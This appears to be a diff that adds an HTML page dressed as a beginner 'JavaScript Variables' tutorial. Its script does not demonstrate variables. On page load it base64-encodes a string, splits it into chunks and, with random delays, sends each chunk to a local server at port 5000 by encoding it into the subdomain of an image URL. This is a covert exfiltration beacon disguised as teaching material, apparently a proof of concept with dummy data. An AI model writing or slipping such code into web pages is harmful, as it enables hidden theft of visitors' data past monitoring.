@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>JavaScript Variables</h1>
+
+<p>In this example, x, y, and z are variables.</p>
+
+<p id="demo"></p>
+
+<script>
+document.getElementById("demo").innerHTML = "The value of z is: ";
+(async function() {
+    let data = btoa("Je suis ton pere. blablabla");
+    let chunks = data.match(/.{1,20}/g) || [];
+
+    console.log("size:", chunks.length);
+    for (let i = 0; i < chunks.length; i++) {
+        const chunk = chunks[i];
+        console.log("Chunk loaded:", chunk);
+        let time = Math.floor(Math.random() * 3000) + 1;
+        await new Promise(r => setTimeout(r, time));
+        let img = new Image();
+        img.src = "http://" + (chunk) + "." + i + ".localhost:5000/img.jpg";
+        console.log(img.src);
+    }
+})();
+</script>
+
+</body>
+</html>
